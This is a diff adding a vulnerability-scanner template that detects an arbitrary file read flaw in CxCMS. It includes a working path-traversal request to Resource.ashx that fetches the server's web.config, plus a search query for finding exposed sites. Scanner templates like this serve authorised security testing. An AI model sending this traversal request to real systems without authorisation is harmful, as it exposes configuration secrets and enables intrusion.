@@ -1,0 +1,25 @@
+id: cxcms-arbitrary-file-read
+
+info:
+  name: CxCMS Resource.ashx Arbitrary File Read Vulnerability
+  author: daffainfo
+  severity: high
+  description: |
+    CxCMS has an arbitrary file read vulnerability, due to the loose filtering of the _FilePath parameter on the /Sys/Handler/Resource.ashx page, which can read system sensitive files.
+    fofa-query: "Powered by CxCms"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/CxCMS%20Resource.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Sys/Handler/Resource.ashx?_FilePath=../../web.config"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<!--编辑器设置-->"
